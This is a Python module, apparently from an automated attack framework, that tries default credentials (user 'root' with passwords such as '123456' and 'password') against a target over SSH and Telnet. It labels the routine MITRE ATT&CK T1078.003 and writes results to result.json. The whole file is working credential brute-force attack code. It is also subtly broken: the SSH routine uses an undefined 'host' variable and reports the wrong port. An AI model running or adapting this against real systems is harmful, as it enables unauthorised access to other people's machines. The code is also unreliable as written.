import paramiko

import telnetlib
import socket
import json


USER_LIST = ['root']
PASSWORD_LIST = ['123456', '123456789', 'password']
INITIAL_ACCESS_LOG =  {
    'T1078' : {
        '003' : {
            'command' : [],
            'result' : []
        }
    },
}
LOG_TEMP = []

class InitialAccess:

    def __init__(self, target, ssh, telnet):
        self.target = target
        self.ssh = ssh
        self.telnet = telnet

    def initial_access_run(self):
        with open('result.json', 'rt', encoding='utf-8') as f:
            data = json.load(f)

        self.T1078_003() 
        
        INITIAL_ACCESS_LOG['T1078']['003']['result'] = LOG_TEMP
        data['result']['initial_access_log'] = INITIAL_ACCESS_LOG
        with open('result.json', 'wt', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

    def SSHLogin(self):
        for i in range(len(USER_LIST)):
            username = USER_LIST[i]
            for j in range(len(PASSWORD_LIST)):
                password = PASSWORD_LIST[j]
                try: 
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=self.ssh, username=username, password=password)
                    ssh_session = ssh.get_transport().open_session()
                    if ssh_session.active:
                        result_string = f'[+] SSH login successful on {self.target}:{self.telnet} {username} : {password}'
                        ssh.close()
                except:
                    result_string = f'[-] SSH login failed {username} {password}'
                
                print(result_string)
                LOG_TEMP.append(result_string)

    def TelnetLogin(self):
        for i in range(len(USER_LIST)):
            username = USER_LIST[i]
            for j in range(len(PASSWORD_LIST)):
                password = PASSWORD_LIST[j]
                tn = telnetlib.Telnet(self.target, self.telnet, timeout=1)
                tn.read_until(b'login: ')
                tn.write((username + '\n').encode('utf-8'))
                tn.read_until(b'Password: ')
                tn.write((password + '\n').encode('utf-8'))

                try: 
                    result = tn.expect([b'Welcome'])
                    if (result[0] != -1):
                        result_string = f'[+] Telnet login successful on {self.target}:{self.telnet} {username} : {password}'
                        tn.close()
                except (EOFError, socket.timeout):
                    result_string = f'[-] Telnet login failed {username} {password}'
                
                print(result_string)
                LOG_TEMP.append(result_string)

    def T1078_003(self):
        self.SSHLogin()
        self.TelnetLogin()
